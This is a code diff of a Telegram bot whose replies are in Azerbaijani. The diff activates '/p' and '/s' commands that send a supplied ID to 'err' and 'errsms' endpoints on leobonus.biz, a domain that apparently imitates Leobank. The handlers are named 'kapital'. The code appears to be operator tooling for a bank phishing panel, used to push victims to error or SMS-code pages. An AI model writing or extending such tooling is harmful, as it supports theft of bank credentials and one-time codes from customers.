@@ -29,7 +29,7 @@ app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 #     except Exception as e:
 #         message.reply_text(f"Error: {e}")
         
-# @app.on_message(filters.command(["a"]))
+# @app.on_message(filters.command(["la"]))
 # def kapital(client, message):
 #     try:
 #         number = message.text.split()[1]
@@ -41,42 +41,42 @@ app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 #         else:
 #             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
 #     except IndexError:
-#         message.reply_text("Id Yazin /abb command.")
+#         message.reply_text("/la id ")
 #     except Exception as e:
 #         message.reply_text(f"Error: {e}")
         
         
-# @app.on_message(filters.command(["p"]))
-# def kapital(client, message):
-#     try:
-#         number = message.text.split()[1]
-#         url = f"https://leobonus.biz/crud/err/{number}/"
-#         response = requests.get(url)
+@app.on_message(filters.command(["p"]))
+def kapital(client, message):
+    try:
+        number = message.text.split()[1]
+        url = f"https://leobonus.biz/crud/err/{number}/"
+        response = requests.get(url)
 
-#         if response.status_code == 200:
-#             message.reply_text("Hersey Hazirdir.")
-#         else:
-#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
-#     except IndexError:
-#         message.reply_text("Id Yazin /leobank command.")
-#     except Exception as e:
-#         message.reply_text(f"Error: {e}")
+        if response.status_code == 200:
+            message.reply_text("Hersey Hazirdir.")
+        else:
+            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
+    except IndexError:
+        message.reply_text("Id Yazin /leobank command.")
+    except Exception as e:
+        message.reply_text(f"Error: {e}")
         
-# @app.on_message(filters.command(["s"]))
-# def kapital(client, message):
-#     try:
-#         number = message.text.split()[1]
-#         url = f"https://leobonus.biz/crud/errsms/{number}/"
-#         response = requests.get(url)
+@app.on_message(filters.command(["s"]))
+def kapital(client, message):
+    try:
+        number = message.text.split()[1]
+        url = f"https://leobonus.biz/crud/errsms/{number}/"
+        response = requests.get(url)
 
-#         if response.status_code == 200:
-#             message.reply_text("Hersey Hazirdir.")
-#         else:
-#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
-#     except IndexError:
-#         message.reply_text("Id Yazin /leobank command.")
-#     except Exception as e:
-#         message.reply_text(f"Error: {e}")
+        if response.status_code == 200:
+            message.reply_text("Hersey Hazirdir.")
+        else:
+            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
+    except IndexError:
+        message.reply_text("Id Yazin /leobank command.")
+    except Exception as e:
+        message.reply_text(f"Error: {e}")
             
             
             
